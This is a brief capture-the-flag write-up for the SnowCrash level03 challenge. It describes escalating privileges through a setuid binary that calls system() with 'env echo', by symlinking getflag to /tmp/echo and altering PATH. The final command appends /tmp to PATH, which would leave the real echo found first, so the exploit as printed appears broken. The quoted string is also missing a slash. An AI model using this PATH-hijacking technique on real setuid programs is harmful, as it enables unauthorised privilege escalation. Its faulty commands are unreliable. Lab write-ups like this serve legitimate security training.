There is a file level03 in the home folder

It has "s" in the execution permissions, meaning it will set its uid to flag03 in this case:
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

We found the string literal "usr/bin/env echo Exploit me", and after some search with gdb, we found that it is used as a parameter of the function "system"
We can then just create a symbolic link from echo to getflag to have it executed as the right owner when we run ~/level03:
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ PATH=$PATH:/tmp/ ./level03
